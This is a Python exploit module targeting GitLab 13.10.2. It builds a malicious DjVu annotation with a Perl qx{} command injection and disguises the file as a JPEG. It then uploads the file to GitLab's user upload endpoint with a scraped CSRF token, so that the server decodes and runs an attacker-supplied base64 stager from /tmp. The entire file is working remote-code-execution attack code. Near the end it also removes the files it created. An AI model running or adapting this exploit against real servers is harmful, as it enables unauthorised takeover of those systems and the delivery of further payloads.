import requests
from bs4 import BeautifulSoup
import os


def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int, stager: str) -> bool | Exception:
    try:
        print('[+] Attempting to gain initial access with gitlab 13.10.2 RCE on {}'.format(ip_dest))

        gitlab_url = 'http://{0}:{1}'.format(ip_dest, port_dest)
        command = "/bin/bash -c 'echo {0} | base64 -d > /tmp/stager.sh && chmod +x /tmp/stager.sh && /tmp/stager.sh'".format(stager.decode("utf-8"))

        session = requests.Session()

        r = session.get(gitlab_url + "/users/sign_in")
        soup = BeautifulSoup(r.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")

        rce_payload = f'(metadata\n\t(Copyright "\\\n" . qx{{{command}}} . \\\n" b ") )\n'.encode()

        with open("rce.txt", "wb") as text_file:
            text_file.write(rce_payload)

        check = os.popen('which djvumake').read()
        if (check == ""):
            exit("Install djvulibre-bin : sudo apt install djvulibre-bin")

        os.system("djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg")

        upload_file_url = f"{gitlab_url}/uploads/user"
        cookies = {'sidebar_collapsed': 'false', 'event_filter': 'all', 'hide_auto_devops_implicitly_enabled_banner_1': 'false', "_gitlab_session": session.cookies["_gitlab_session"], }
        files = {"file": ("rce.jpg", open("rce.jpg", "rb"), "image/jpeg")}
        session.post(url=upload_file_url, files=files, headers={"X-CSRF-Token": token, "Referer": upload_file_url, "Accept": "application/json"}, cookies=cookies)

        os.system("rm rce.jpg && rm rce.txt")
        return True
    except Exception as e:
        return e
